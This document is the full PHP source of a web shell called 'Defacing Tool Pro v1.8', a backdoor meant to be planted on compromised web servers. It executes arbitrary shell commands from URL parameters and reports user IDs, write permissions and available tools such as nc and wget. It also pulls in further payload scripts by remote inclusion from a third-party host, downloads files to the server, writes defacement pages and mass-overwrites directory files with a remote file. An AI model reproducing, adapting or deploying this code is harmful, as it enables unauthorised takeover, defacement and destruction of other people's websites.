<!--
Defacing Tool 1.8 by r3v3ng4ns
revengans@hotmail.com
codigo reescrito
-->
<?php
@closelog();
@error_reporting(0);
$vers="1.8 priv8";
$remote_addr="http://www.cmjn.ce.gov.br/yc/";
$format_addr=".txt";
$cmd_addr=$remote_addr."pro18".$format_addr;
$safe_addr=$remote_addr."safe17".$format_addr;
$writer_addr=$remote_addr."writer17".$format_addr;
$phpget_addr=$remote_addr."get17".$format_addr;
$feditor_addr=$remote_addr."filed".$format_addr;
$put_addr=$remote_addr."filed_put".$format_addr;
$total_addr="http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];

if(empty($chdir)) $chdir = $_REQUEST['chdir'];
if(empty($cmd)) $cmd = $_REQUEST['cmd'];
if(empty($fu)) $fu = $_REQUEST['fu'];
if(empty($list)) $list = $_REQUEST['list'];
if(empty($qualMet)) $qualMet = $_REQUEST['qualMet'];

if(empty($chdir) or $chdir=='') $chdir=getcwd();
$cmd = stripslashes(trim($cmd));

//CHDIR tool
if (strpos($cmd, 'chdir')!==false and strpos($cmd, 'chdir')=='0'){
   $boom = explode(" ",$cmd,2);
   $boom2 = explode(";",$boom['1'], 2);
   $toDir = $boom2['0'];

   if($boom['1']=="/")$chdir="";
   else if(strpos($cmd, 'chdir ..')!==false){
     $cadaDir = array_reverse(explode("/",$chdir));
     if($cadaDir['0']=="" or $cadaDir['0'] ==" ") $lastDir = $cadaDir['1']."/";
     else{ $lastDir = $cadaDir['0']."/"; $chdir = $chdir."/";}
     $toDir = str_replace($lastDir,"",$chdir);
     if($toDir=="/")$chdir="";
   } else if(strpos($cmd, 'chdir .')!==false) $toDir = getcwd();
   if(strrpos($toDir,"/")==(strlen($toDir)-1)) $toDir=substr($toDir,0,strrpos($toDir,"/"));
   if(@opendir($toDir)!==false or @is_dir($toDir)) $chdir=$toDir;
   else if(@opendir($chdir."/".$toDir)!==false or @is_dir($chdir."/".$toDir)) $chdir=$chdir."/".$toDir;
   else $ch_msg="dtool: line 1: chdir: $toDir: No such directory.\n";
   if($boom2['1']==null) $cmd = trim($boom['2']); else $cmd = trim($boom2['1'].$boom2['2']);
   if(strpos($chdir, '//')!==false) $chdir = str_replace('//', '/', $chdir);
}
if(!@opendir($chdir)) $ch_msg="dtool: line 1: chdir: It seems that the permission have been denied in dir '$chdir'. Anyway, you can try to send a command here now. If you haven't accessed it, try to use 'cd' instead.\n";
$cmdShow = $cmd;

//To keep the changes in the url, when using the 'GET' way to send php variables
if(empty($post)){
	if($chdir==getcwd() or empty($chdir) or $chdir=="")$showdir="";else $showdir="+'chdir=$chdir&'";
	if($fu=="" or $fu=="0" or empty($fu))$showfu="";else $showfu="+'fu=$fu&'";
	if($list=="" or $list=="0" or empty($list)){$showfl="";$fl="on";}else{$showfl="+'list=1&'"; $fl="off";}
}

//INFO table (pro and normal)
if (@file_exists("/usr/X11R6/bin/xterm")) $pro1="<i>xterm</i> at /usr/X11R6/bin/xterm, ";
if (@file_exists("/usr/bin/nc")) $pro2="<i>nc</i> at /usr/bin/nc, ";
if (@file_exists("/usr/bin/wget")) $pro3="<i>wget</i> at /usr/bin/wget, ";
if (@file_exists("/usr/bin/lynx")) $pro4="<i>lynx</i> at /usr/bin/lynx, ";
if (@file_exists("/usr/bin/gcc")) $pro5="<i>gcc</i> at /usr/bin/gcc, ";
if (@file_exists("/usr/bin/cc")) $pro6="<i>cc</i> at /usr/bin/cc ";
$pro=$pro1.$pro2.$pro3.$pro4.$pro5.$pro6;
$login=@posix_getuid(); $euid=@posix_geteuid(); $gid=@posix_getgid();
$ip=@gethostbyname($_SERVER['HTTP_HOST']);

//Turns the 'ls' command more usefull, showing it as it looks in the shell
if(strpos($cmd, 'ls --') !==false) $cmd = str_replace('ls --', 'ls -F --', $cmd);
else if(strpos($cmd, 'ls -') !==false) $cmd = str_replace('ls -', 'ls -F', $cmd);
else if(strpos($cmd, ';ls') !==false) $cmd = str_replace(';ls', ';ls -F', $cmd);
else if(strpos($cmd, '; ls') !==false) $cmd = str_replace('; ls', ';ls -F', $cmd);
else if($cmd=='ls') $cmd = "ls -F";

//If there are some '//' in the cmd, its now removed
if(strpos($chdir, '//')!==false) $chdir = str_replace('//', '/', $chdir);
?>
<body onload="cmdField.focus();cmdField.select();">
<style>.campo{font-family: Verdana; color:white;font-size:11px;background-color:#414978;height:23px}
.infop{font-family: verdana; font-size: 10px; color:#000000;}
.infod{font-family: verdana; font-size: 10px; color:#414978;}
.algod{font-family: verdana; font-size: 12px; font-weight: bold; color: #414978;}
.titulod{font:Verdana; color:#414978; font-size:20px;}</style>
<script>
function inclVar(){var addr = location.href.substring(0,location.href.indexOf('?')+1);var stri = location.href.substring(addr.length,location.href.length+1);inclvar = stri.substring(0,stri.indexOf('='));}
function enviaCMD(){inclVar();window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$cmd_addr;?>'+'?&'<?=$showdir.$showfu.$showfl;?>+'cmd='+cmdField.value;return false;}
function ativaFe(qual){inclVar();window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$cmd_addr;?>'+'?&'<?=$showdir.$showfl;?>+'fu='+qual+'&cmd='+cmdField.value;return false;}
function PHPget(){inclVar();var c=prompt("[ PHPget ] by r3v3ng4ns\nDigite a ORIGEM do arquivo (url) com ate 7Mb\n-Utilize caminho completo\n-Se for remoto, use http:// ou ftp://:","http://www.fineca.net/music/");var dir = c.substring(0,c.lastIndexOf('/')+1);var file = c.substring(dir.length,c.length+1);var p=prompt("[ PHPget ] by r3v3ng4ns\nDigite o DESTINO do arquivo\n-Utilize caminho completo\n-O diretorio de destino deve ser writable","<?=$chdir;?>/"+file);window.open('<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$phpget_addr;?>'+'?&'+'inclvar='+inclvar+'&'<?=$showdir;?>+'c='+c+'&p='+p);}
function PHPwriter(){inclVar();var url=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite a URL do frame","http://www.geocities.com/revensite/index.htm");var dir = url.substring(0,url.lastIndexOf('/')+1);var file = url.substring(dir.length,url.length+1);var f=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite o Nome do arquivo a ser criado\n-Utilize caminho completo\n-O diretorio de destino deve ser writable","<?=$chdir;?>/"+file); t=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite o Title da pagina","[ r00ted team ] owned you :P");window.open('<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$writer_addr;?>'+'?&'+'inclvar='+inclvar+'&'<?=$showdir;?>+'url='+url+'&f='+f+'&t='+t);}
function PHPf(){inclVar();var o=prompt("[ PHPfilEditor ] by r3v3ng4ns\nDigite o nome do arquivo que deseja abrir\n-Utilize caminho completo\n-Abrir arquivos remotos, use http:// ou ftp://","<?=$chdir;?>/index.php"); var dir = o.substring(0,o.lastIndexOf('/')+1);var file = o.substring(dir.length,o.length+1);window.open('<?=$total_addr;?>?'+inclvar+'=<?=$feditor_addr;?>?&inclvar='+inclvar+'&o='+o);}
function safeMode(){inclVar();if (confirm ('Deseja ativar o DTool com suporte a SafeMode?')){window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$safe_addr;?>'+'&'<?=$showdir;?>;}else{ return false }}
function list(turn){inclVar();if(turn=="off")turn=0;else if(turn=="on")turn=1; window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$cmd_addr;?>'+'?&'<?=$showdir.$showfu;?>+'list='+turn+'&cmd='+cmdField.value;return false;}
function overwrite(){inclVar();if(confirm("O script tentara substituir todos os arquivos (do diretorio atual) que\nteem no nome a palavra chave especificada. Os arquivos serao\nsubstituidos pelo novo arquivo, especificado por voce.\n\nLembre-se!\n-Se for para substituir arquivos com a extensao jpg, utilize\ncomo palavra chave .jpg (inclusive o ponto!)\n-Utilize caminho completo para o novo arquivo, e se for remoto,\nutilize http:// e ftp://")){keyw=prompt("Digite a palavra chave",".jpg");newf=prompt("Digite a origem do arquivo que substituira","http://www.colegioparthenon.com.br/ingles/bins/revenmail.jpg");if(confirm("Se ocorrer um erro e o arquivo nao puder ser substituido, deseja\nque o script apague os arquivos e crie-os novamente com o novo conteudo?\nLembre-se de que para criar novos arquivos, o diretorio deve ser writable.")){trydel=1}else{trydel=0} if(confirm("Deseja substituir todos os arquivos do diretorio\n<?=$chdir;?> que contenham a palavra\n"+keyw+" no nome pelo novo arquivo de origem\n"+newf+" ?\nIsso pode levar um tempo, dependendo da quantidade de\narquivos e do tamanho do arquivo de origem.")){window.location.href='<?=$total_addr;?>?'+inclvar+'=<?=$cmd_addr;?>?&chdir=<?=$chdir;?>&list=1&'<?=$showfu?>+'&keyw='+keyw+'&newf='+newf+'&trydel='+trydel;return false;}}}
</script>
<table width="690" border="0" align="center" cellpadding="2" cellspacing="0" bgcolor="#FFFFFF">
<tr><td><div align="center" class="titulod"><b>[ Defacing Tool Pro v<?=$vers;?> ]<br>
<font size=2>by r3v3ng4ns - revengans@hotmail.com </font>
</b></div></td></tr>
<tr><td><TABLE width="370" BORDER="0" align="center" CELLPADDING="0" CELLSPACING="0">
<?php
 $uname = @posix_uname();
 while (list($info, $value) = each ($uname)) { ?>
<TR><TD><DIV class="infop"><b><?=$info ?>:</b> <?=$value;?></DIV></TD></TR><?php } ?>
<TR><TD><DIV class="infop"><b>user:</b> uid(<?=$login;?>) euid(<?=$euid;?>) gid(<?=$gid;?>)</DIV></TD></TR>
<TR><TD><DIV class="infod"><b>write permission:</b><? if(@is_writable($chdir)){ echo " <b>YES</b>"; }else{ echo " no"; } ?></DIV></TD></TR>
<TR><TD><DIV class="infop"><b>server info: </b><?="$SERVER_SOFTWARE $SERVER_VERSION";?></DIV></TD></TR>
<TR><TD><DIV class="infop"><b>pro info: ip </b><?="$ip, $pro";?></DIV></TD></TR>
<? if($chdir!=getcwd()){?>
<TR><TD><DIV class="infop"><b>original path: </b><?=getcwd() ?></DIV></TD></TR><? } ?>
<TR><TD><DIV class="infod"><b>current path: </b><?=$chdir ?>
</DIV></TD></TR></TABLE></td></tr>
<tr><td><form name="cForm" id="cForm" method="post" action="#" onSubmit="return enviaCMD()">
<table width="375" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#414978"><tr><td><table width="370" border="0" align="center" cellpadding="1" cellspacing="1" bgcolor="white"><tr>
<td width="75"><DIV class="algod">command</DIV></td>
<td width="300"><input name="cmdField" type="text" id="cmdField" value='<?=$cmdShow;?>' style="width:295; font-size:12px" class="campo">
</td></tr></table><table><tr><td>
<?php
if(isset($chdir)) @chdir($chdir);
ob_start();
function safemode($what){echo "It seems that this server is using php in safemode. Try to use DTool in Safemode.";}
function popenn($what){$handle=popen("$what", "r");$out=@fread($handle, 2096);echo $out;@pclose($handle);}
function execc($what){exec("$what",$array_out);$out=implode("\n",$array_out);echo $out;}
function shell($what){echo(shell_exec($what));}
$funE="function_exists";
if($funE('passthru')){$fe="passthru";$feshow=$fe;}
elseif($funE('system')){$fe="system";$feshow=$fe;}
elseif($funE('exec')){$fe="execc";$feshow="exec";}
elseif($funE('popen')){$fe="popenn";$feshow="popen";}
elseif($funE('shell_exec')){$fe="shell";$feshow="shell_exec";}
else {$fe="safemode";$feshow=$fe;}
if($fu!="" or !empty($fu)){
  if($fu==1){$fe="passthru";$feshow=$fe;}
  if($fu==2){$fe="system";$feshow=$fe;}
  if($fu==3){$fe="execc";$feshow="exec";}
  if($fu==4){$fe="popenn";$feshow="popen";}
  if($fu==5){$fe="shell";$feshow="shell_exec";}
}
$fe("$cmd  2>&1");
$output=ob_get_contents();ob_end_clean();
?>
<td><input type="button" name="snd" value="send cmd" class="campo" style="background-color:#313654" onClick="enviaCMD()"><select name="qualF" id="qualF" class="campo" style="background-color:#313654" onchange="ativaFe(this.value);">
<option><?="using $feshow()";?>
<option value="1">use passthru()
<option value="2">use system()
<option value="3">use exec()
<option value="4">use popen()
<option value="5">use shell_exec()
<option value="0">auto detect (default)
</select><input type="button" name="getBtn" value="PHPget" class="campo" onClick="PHPget()"><input type="button" name="writerBtn" value="PHPwriter" class="campo" onClick="PHPwriter()"><br><input type="button" name="edBtn" value="fileditor" class="campo" onClick="PHPf()"><input type="button" name="listBtn" value="list files <?=$fl;?>" class="campo" onClick="list('<?=$fl;?>')"><input type="button" name="sbstBtn" value="overwrite files" class="campo" onClick="overwrite()"><input type="button" name="smBtn" value="safemode" class="campo" onClick="safeMode()">
</tr></table></td></tr></table></form></td></tr>
<tr><td align="center"><DIV class="algod"><br>stdOut from <?="\"<i>$cmdShow</i>\", using <i>$feshow()</i>";?></i></DIV>
<TEXTAREA name="output_text" COLS="90" ROWS="10" STYLE="font-family:Courier; font-size: 12px; color:#FFFFFF; font-size:11 px; background-color:black;width:683;">
<?php
echo $ch_msg;
if (empty($cmd) and $ch_msg=="") echo ("Comandos Exclusivos do DTool Pro\n\nchdir &lt;diretorio&gt;; outros; cmds;\nMuda o diretorio para aquele especificado e permanece nele. Eh como se fosse o 'cd' numa shell, mas precisa ser o primeiro da linha. ex: chdir /diretorio/sub/;pwd;ls\n\nPHPget, PHPwriter, Fileditor, File List e Overwrite\nfale com o r3v3ng4ns :P");
if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
?></TEXTAREA><BR></td></tr>
<?php
if($list=="1") @include($remote_addr."flist".$format_addr);
?>
</table>
